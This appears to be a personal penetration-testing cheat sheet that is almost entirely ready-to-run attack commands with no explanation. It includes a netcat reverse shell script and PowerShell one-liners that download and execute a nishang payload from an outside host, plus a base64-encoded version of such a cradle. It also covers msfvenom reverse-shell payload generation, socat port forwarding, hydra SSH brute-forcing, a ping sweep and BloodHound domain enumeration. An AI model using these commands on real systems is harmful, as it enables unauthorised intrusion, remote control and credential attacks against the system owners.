shell stabilization : 
    python -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    stty raw -echo;fg

socat reverse shell

echo nc reverse shell:
    echo -e '#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.40.5  10101 >/tmp/f' > /root/copy.sh

Local ping sweep :
    for i in {1..255}; do (ping -c 3 10.185.10.${i} | grep "bytes from" &); done

port forwarding socat :
    /tmp/socat tcp-l:21445,fork,reuseaddr tcp:10.185.10.27:445 &

msfvenom payload generation:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=10101 -f elf -o rev

gobuster:
    gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10 -r -t 50

hydra:
    hydra -L users.txt -P pass.txt ssh://10.10.10.10

    hydra -l matsiro -p 'dfkla;dfl; ' ssh://127.0.0.1

Ps1 revshell exec command from web server : 
    - powershell -ep bypass -c "IEX(IWR http://10.4.73.73/nishang.ps1 -UseBasicParsing)"
    - powershell -ep bypass "IEX(New-Object Net.WebClient).downloadString('http://10.4.73.73/nishang.ps1')"

Encode PS1 reverse shell command :
    - echo 'IEX( IWR http://10.10.10.10:8000/rev.ps1 -UseBasicParsing)' | iconv -t utf-16le | base64

Switch user
    powershell -exec bypass -nop -c "$username = \"<USERNAME>\"; $password = \"<PASSWORD>\"; $securepass = ConvertTo-SecureString $password -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential($username, $securepass); Invoke-Command -ScriptBlock {powershell -c <COMMAND>} -Credential $cred -computer <COMPUTER-NAME>"

Encode to base 64
    powershell -c certutil -encode "<PATH-TO-BINARY>" <PATH-TO-OUTPUT> 

bloodhound : 
    - bloodhound-python -u <USERNAME> -P <PASSWORD> -ns <IP> -d <DOMAIN-NAME> -c all
    - neo4j console
    - bloodhound